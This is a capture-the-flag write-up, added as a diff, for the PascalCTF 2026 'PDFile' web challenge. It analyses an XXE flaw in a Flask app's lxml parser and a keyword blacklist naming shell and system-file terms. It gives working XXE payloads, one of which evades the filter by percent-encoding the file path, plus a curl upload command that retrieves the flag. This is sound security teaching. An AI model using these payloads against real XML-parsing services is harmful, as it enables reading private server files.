@@ -1,0 +1,212 @@
+---
+title: 'PascalCTF 2026 - PDFile'
+description: 'Writeup for PDFile from PascalCTF 2026. A Web challenge involving XXE via XML Parser Misconfiguration.'
+date: 2026-02-01
+tags: ['writeup', 'web', 'xxe', 'xml', 'filter-bypass', 'pascalctf']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Challenge:** PDFile
+**Category:** Web
+**Event:** PascalCTF
+**Flag:** `pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}`
+
+PDFile is a web application called "PasX Book Parser" that allows users to upload `.pasx` XML files and converts them into PDF documents. The application parses XML content to extract book metadata (title, author, year, ISBN) and chapters, then generates a formatted PDF.
+
+**Target URL:** https://pdfile.ctf.pascalctf.it/
+
+## Source Code Analysis
+
+### Application Structure
+
+```
+pdfile/
+├── app.py              # Main Flask application
+├── requirements.txt    # Python dependencies (flask, lxml, reportlab)
+├── Dockerfile          # Container configuration
+├── docker-compose.yml  # Deployment config
+└── templates/
+    └── index.html      # Web UI
+```
+
+### Key Components
+
+#### 1. XML Parser Configuration (`app.py:51-52`)
+
+```python
+parser = etree.XMLParser(encoding='utf-8', no_network=False, resolve_entities=True, recover=True)
+root = etree.fromstring(xml_content, parser=parser)
+```
+
+**Critical Security Issues:**
+- `resolve_entities=True` - Enables XML entity resolution
+- `no_network=False` - Allows external network requests
+- These settings make the application vulnerable to **XXE (XML External Entity) injection**
+
+#### 2. Sanitization Function (`app.py:25-41`)
+
+```python
+def sanitize(xml_content):
+    try:
+        content_str = xml_content.decode('utf-8')
+    except UnicodeDecodeError:
+        return False
+
+    if "&#" in content_str:
+        return False
+
+    blacklist = [
+        "flag", "etc", "sh", "bash",
+        "proc", "pascal", "tmp", "env",
+        "bash", "exec", "file", "pascalctf is not fun",
+    ]
+    if any(a in content_str.lower() for a in blacklist):
+        return False
+    return True
+```
+
+**Sanitization Checks:**
+1. Content must be valid UTF-8
+2. Blocks numeric character references (`&#`)
+3. Blacklists keywords (case-insensitive): `flag`, `etc`, `sh`, `bash`, `proc`, `pascal`, `tmp`, `env`, `exec`, `file`
+
+#### 3. Flag Location (`Dockerfile:12`)
+
+```dockerfile
+RUN echo "$FLAG" > /app/flag.txt
+```
+
+The flag is stored at `/app/flag.txt`.
+
+## Vulnerability Analysis
+
+### XXE Injection
+
+The XML parser is configured to resolve external entities, which allows an attacker to:
+- Read arbitrary files from the server
+- Perform Server-Side Request Forgery (SSRF)
+- Potentially achieve Remote Code Execution in some configurations
+
+A basic XXE payload would look like:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE book [
+  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
+]>
+<book>
+  <title>&xxe;</title>
+</book>
+```
+
+However, this payload is blocked by the sanitization function because it contains:
+- `file` (in `file://`)
+- `flag` (in `/app/flag.txt`)
+
+### Sanitization Bypass
+
+The sanitization performs a simple substring check on the **raw XML content** after lowercasing it. This can be bypassed using **URL percent-encoding**.
+
+**Key Insight:** The SYSTEM identifier in XML external entities is treated as a URI. URIs support percent-encoding, where characters can be represented as `%XX` (hex value).
+
+| Character | Percent-Encoded |
+|-----------|-----------------|
+| f         | %66             |
+| l         | %6C             |
+| a         | %61             |
+| g         | %67             |
+
+So `flag` becomes `%66%6C%61%67`.
+
+**Why This Works:**
+
+1. The raw XML content contains `%66%6C%61%67` which, when lowercased, remains `%66%6c%61%67`
+2. This string does NOT contain "flag" as a substring - it contains literal percent signs and hex digits
+3. The sanitization check passes
+4. When lxml parses the XML and processes the SYSTEM identifier, it decodes the percent-encoding
+5. The decoded path `/app/flag.txt` is then used to read the file
+
+## Exploitation
+
+### Step 1: Verify XXE Processing
+
+First, confirm that external entities are being processed by testing with a non-existent file:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE book [
+  <!ENTITY xxe SYSTEM "/does_not_exist_12345">
+]>
+<book>
+  <title>&xxe;</title>
+  <author>Test Author</author>
+  <year>2024</year>
+  <chapters>
+    <chapter number="1">
+      <title>Test Chapter</title>
+      <content>Content here</content>
+    </chapter>
+  </chapters>
+</book>
+```
+
+**Response:**
+```json
+{"book_author":"Test Author","book_title":"","pdf_url":"/pdf/...","success":true}
+```
+
+The empty `book_title` confirms the entity was processed (resolved to empty since file doesn't exist).
+
+### Step 2: Craft Bypass Payload
+
+Create the payload with percent-encoded path:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE book [
+  <!ENTITY xxe SYSTEM "/app/%66%6C%61%67.txt">
+]>
+<book>
+  <title>&xxe;</title>
+  <author>Test Author</author>
+  <year>2024</year>
+  <chapters>
+    <chapter number="1">
+      <title>Test Chapter</title>
+      <content>Content here</content>
+    </chapter>
+  </chapters>
+</book>
+```
+
+**Breakdown:**
+- `/app/%66%6C%61%67.txt` decodes to `/app/flag.txt`
+- The raw content doesn't contain blocked keywords
+- No `file://` scheme needed - lxml treats bare paths as local files
+
+### Step 3: Upload and Extract Flag
+
+Save the payload as `exploit.pasx` and upload:
+
+```bash
+curl -s -X POST -F "file=@exploit.pasx" https://pdfile.ctf.pascalctf.it/upload
+```
+
+**Response:**
+```json
+{
+  "book_author": "Test Author",
+  "book_title": "pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}\n",
+  "pdf_url": "/pdf/d613da2de9ed414483fb4a235e7cda21.pdf",
+  "success": true
+}
+```
+
+## Flag
+
+```text
+pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}
+```
